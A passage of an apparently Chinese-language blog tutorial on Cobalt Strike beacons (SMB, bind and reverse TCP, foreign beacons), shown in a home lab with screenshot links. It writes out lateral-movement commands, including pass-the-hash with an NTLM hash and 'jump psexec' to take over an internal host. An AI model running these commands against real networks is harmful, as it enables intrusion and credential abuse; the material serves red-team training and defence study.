+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">rev2self</span><br><span class="line">pth .\administrator ae4c0d5fb959fda8f4cb1d14a8376af4</span><br><span class="line">shell dir \\192.168.3.73\c$</span><br><span class="line">jump psexec 192.168.3.73 test666</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8ECobaltStrike%E5%90%84%E7%A7%8D%E5%8D%8F%E8%AE%AEbeacon%E7%9A%84%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/image-20200904143524423.png" alt="image-20200904143524423"></p>
+<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8ECobaltStrike%E5%90%84%E7%A7%8D%E5%8D%8F%E8%AE%AEbeacon%E7%9A%84%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/image-20200904143530695.png" alt="image-20200904143530695"></p>
+<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8ECobaltStrike%E5%90%84%E7%A7%8D%E5%8D%8F%E8%AE%AEbeacon%E7%9A%84%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/image-20200904143624650.png" alt="image-20200904143624650"></p>
+<p>​        smb beacon在运行过程中不是和我们的teamserver服务端直接通信的，而是和它的父beacon进行通信，再把结果显示出来，因此我们不能直接生成stage或者stageless的exe去执行，因为执行后找不到父进程。</p>
+<h3 id="TCP-beacon"><a href="#TCP-beacon" class="headerlink" title="TCP beacon"></a>TCP beacon</h3><h4 id="bind-tcp-beacon"><a href="#bind-tcp-beacon" class="headerlink" title="bind tcp beacon"></a>bind tcp beacon</h4><p>​        tcp beacon和smb beacon类似，也是在内网中使用的，原理也是利用了边界主机作一个中转，它会再内网主机上开启4444端口，我们通过这个端口来接收内网机器的流量。先来看看如何使用</p>
+<p>​        首先建立一个TCP listener</p>
+<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8ECobaltStrike%E5%90%84%E7%A7%8D%E5%8D%8F%E8%AE%AEbeacon%E7%9A%84%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/image-20200904145041421.png" alt="image-20200904145041421"></p>
+<p>​        建立好以后，再和内网主机建立ipc连接，使用jump命令上线内网断网主机</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jump psexec 192.168.3.73 test666  ///test666为tcp listener的名字</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8ECobaltStrike%E5%90%84%E7%A7%8D%E5%8D%8F%E8%AE%AEbeacon%E7%9A%84%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/image-20200904145254580.png" alt="image-20200904145254580"></p>
+<p>​        上线后我们使用wireshark看一看流量，我们可以看到内网主机是通过开放4444端口，通过边界机的某个端口和内网的主机通过TCP进行通信，最后再由边界机将流量发送给我们的服务端。</p>
+<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8ECobaltStrike%E5%90%84%E7%A7%8D%E5%8D%8F%E8%AE%AEbeacon%E7%9A%84%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/image-20200904152346964.png" alt="image-20200904152346964"></p>
+<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8ECobaltStrike%E5%90%84%E7%A7%8D%E5%8D%8F%E8%AE%AEbeacon%E7%9A%84%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/image-20200904152004125.png" alt="image-20200904152004125"></p>
+<p>​        当我们再内网主机上执行命令，可以看到命令是再边界机上和teamserver通信进行传输的。</p>
+<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8ECobaltStrike%E5%90%84%E7%A7%8D%E5%8D%8F%E8%AE%AEbeacon%E7%9A%84%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/image-20200904152253205.png" alt="image-20200904152253205"></p>
+<p>​        从下面的图也可以看出连接的关系，边界机和teamserver之间是反向连接的，而边界机和内网主机是正向连接的。</p>
+<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8ECobaltStrike%E5%90%84%E7%A7%8D%E5%8D%8F%E8%AE%AEbeacon%E7%9A%84%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/image-20200904152525518.png" alt="image-20200904152525518"></p>
+<p>​        下面是断开和连接内网主机的命令,注意看这里连接不是使用link，而是使用connect</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">unlink 192.168.3.73</span><br><span class="line">connect 192.168.3.73</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8ECobaltStrike%E5%90%84%E7%A7%8D%E5%8D%8F%E8%AE%AEbeacon%E7%9A%84%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/image-20200904152724658.png" alt="image-20200904152724658"></p>
+<p>​        对于tcp bind beacon这种形式，我们也可以生成一个stageless的exe，在内网主机上执行，需要注意的是执行后不会直接上线，而是在内网主机上开放一个端口，我们在边界机上使用connect命令去连接目标即可。</p>
+<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8ECobaltStrike%E5%90%84%E7%A7%8D%E5%8D%8F%E8%AE%AEbeacon%E7%9A%84%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/image-20200904153621521.png" alt="image-20200904153621521"></p>
+<p>​        listener这里设置我们的tcp listener的名字</p>
+<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8ECobaltStrike%E5%90%84%E7%A7%8D%E5%8D%8F%E8%AE%AEbeacon%E7%9A%84%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/image-20200904153637610.png" alt="image-20200904153637610"></p>
+<p>​        生成的shell在目标主机执行后，查看端口会开启4444端口的监听</p>
+<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8ECobaltStrike%E5%90%84%E7%A7%8D%E5%8D%8F%E8%AE%AEbeacon%E7%9A%84%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/image-20200904154100177.png" alt="image-20200904154100177"></p>
+<p>​        我们再使用边界机去连接，即可上线</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">connect 192.168.3.73</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8ECobaltStrike%E5%90%84%E7%A7%8D%E5%8D%8F%E8%AE%AEbeacon%E7%9A%84%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/image-20200904154344617.png" alt="image-20200904154344617"></p>
+<h4 id="revserse-tcp-beacon"><a href="#revserse-tcp-beacon" class="headerlink" title="revserse tcp beacon"></a>revserse tcp beacon</h4><p>​        上面演示了关于bind tcp beacon的用法，实际上我们使用reverse tcp beacon来上线断网主机。</p>
+<p>​        首先再边界机上创建一个reverse  tcp listener</p>
+<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8ECobaltStrike%E5%90%84%E7%A7%8D%E5%8D%8F%E8%AE%AEbeacon%E7%9A%84%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/image-20200904154603243.png" alt="image-20200904154603243"></p>
+<p>​        设置的时候需要注意host要写边界机对应的内网的网段，我的测试中192.168.3网段使用的仅主机模式，边界机对应的仅主机模式的地址是192.168.3.144</p>
+<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8ECobaltStrike%E5%90%84%E7%A7%8D%E5%8D%8F%E8%AE%AEbeacon%E7%9A%84%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/image-20200904154713600.png" alt="image-20200904154713600"></p>
+<p>​        生成好以后，我们同样先和内网断网机建立ipc连接，建立后使用jump命令来上线</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jump psexec 192.168.3.73 test123123  //test123123是刚建立的反向tcp listener的名字</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8ECobaltStrike%E5%90%84%E7%A7%8D%E5%8D%8F%E8%AE%AEbeacon%E7%9A%84%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/image-20200904154910274.png" alt="image-20200904154910274"></p>
+<p>​        我们在断网机上看看，使用这种模式会在边界主机开放一个4444端口，断网机和目标的4444端口来进行通信</p>
+<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8ECobaltStrike%E5%90%84%E7%A7%8D%E5%8D%8F%E8%AE%AEbeacon%E7%9A%84%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/image-20200904155149201.png" alt="image-20200904155149201"></p>
+<p>​        从cobaltstrike上也能看到使用的内网主机反向连接了边界主机</p>
+<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8ECobaltStrike%E5%90%84%E7%A7%8D%E5%8D%8F%E8%AE%AEbeacon%E7%9A%84%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/image-20200904155317538.png" alt="image-20200904155317538"></p>
+<p>​        当然也可以生成stageless的exe来上线，生成的exe在内网主机执行后会直接上线，不用我们主动去连接它。</p>
+<h3 id="foreign-beaon"><a href="#foreign-beaon" class="headerlink" title="foreign beaon"></a>foreign beaon</h3><p>​        有时候我们会有这样的需求，就是将我们获得的beacon派生给其他的服务端做稳控，或者派生给msf，这就需要使用foreign beaon。</p>
+<p>​        首先我们在另一个CobaltStrike上开启一个HTTP Listener</p>
+<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8ECobaltStrike%E5%90%84%E7%A7%8D%E5%8D%8F%E8%AE%AEbeacon%E7%9A%84%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/image-20200904163933413.png" alt="image-20200904163933413"></p>
+<p>​    再回到派生的那台cobaltstrike，这台cobaltstrike上已经有了一个上线的主机。我们给这个cobaltstrike上创建一个foreign beacon。地址选择我们刚刚创建http listener的那台主机</p>
+<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8ECobaltStrike%E5%90%84%E7%A7%8D%E5%8D%8F%E8%AE%AEbeacon%E7%9A%84%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/image-20200904164121861.png" alt="image-20200904164121861"></p>
+<p>​    创建好以后，在需要派生的beacon上选择Spawn</p>
+<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8ECobaltStrike%E5%90%84%E7%A7%8D%E5%8D%8F%E8%AE%AEbeacon%E7%9A%84%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/image-20200904164255379.png" alt="image-20200904164255379"></p>
+<p>​        在弹出的框中选择我们创建的foreign listener</p>
+<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8ECobaltStrike%E5%90%84%E7%A7%8D%E5%8D%8F%E8%AE%AEbeacon%E7%9A%84%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/image-20200904164320540.png" alt="image-20200904164320540"></p>
+<p>​        确定后可以看到另一个cobaltstrike上线了，并且可以看到是使用rundll32的方式执行的。</p>
+<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8ECobaltStrike%E5%90%84%E7%A7%8D%E5%8D%8F%E8%AE%AEbeacon%E7%9A%84%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/image-20200904165109471.png" alt="image-20200904165109471"></p>
+<p>​        关于派生给msf的方法类似，就不讲了。</p>
+<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>​        最后我们来总结一下，在cobaltstrike中提供了很多beacon上线的方式，其中http/https/比较适合上线边界主机，当然在网络环境比较差的情况下也可以使用DNS来上线，不过DNS beacon执行命令还可以，但是要上传和下载文件速度会非常慢。在内网横向渗透的时候可以使用SMB beacon和TCP beacon，需要将beacon派生给其他的C2可以使用foreign beaon。</p>
+<p><strong>参考文章</strong></p>
+<p><a target="_blank" rel="noopener" href="https://shimo.im/docs/3RjkWKcQxkrPwxyd/read">关于合法证书+ps上线手把手示范</a></p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7488">cobaltstrike dns beacon知多少</a></p>
+
+      
+    </div>
+
+  </div>
+
+  <div class="article-footer">
+    <div class="article-meta pull-left">
+
+    
+      
+
+    <span class="post-categories">
+      <i class="icon-categories"></i>
+        <a href="/categories/cobaltstrike/">cobaltstrike</a>
+    </span>
+    
+
+    
+
+    </div>
+
+    
+  </div>
+</article>
+
+  
+
+
+
+
+
+
+    </main>
+
+    <footer class="site-footer">
+  <p class="site-info">
+    Proudly powered by <a href="https://hexo.io/" target="_blank">Hexo</a> and
+    Theme by <a href="https://github.com/CodeDaraW/Hacker" target="_blank">Hacker</a>
+    </br>
+    
+    &copy; 2021 藏青
+    
+  </p>
+</footer>
+    
+    
+  </div>
+</div>
+</body>
+</html>
